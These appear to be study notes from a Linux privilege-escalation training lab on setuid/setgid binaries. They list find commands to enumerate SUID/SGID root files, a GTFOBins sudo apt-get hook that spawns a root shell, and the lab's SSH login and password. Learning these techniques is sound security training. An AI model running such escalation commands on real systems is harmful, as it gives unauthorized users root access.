# Special Permissions

The Set User ID upon Execution (setuid) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. 

The setuid bit appears as an s.

https://tech.feub.net/2008/03/setuid-setgid-et-sticky-bit/

## Enumerate Set User ID

find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-xr-x 1 root root 16728 Sep  1 19:06 /home/htb-student/shared_obj_hijack/payroll

The Set-Group-ID (setgid) permission is another special permission that allows us to run binaries as if we were part of the group that created them. 

## Enumerate Set Group ID

find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine

## GTFOBins

The GTFOBins project is a curated list of binaries and scripts that can be used by an attacker to bypass security restrictions :
https://gtfobins.github.io/

sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh

id
uid=0(root) gid=0(root) groups=0(root)

## LAB

ssh htb-student@10.129.181.58
Academy_LLPE!

find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-xr-x 1 root root 73424 Feb 12  2016 /bin/sed

find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-sr-x 1 root root 240 Feb  1  2016 /usr/bin/facter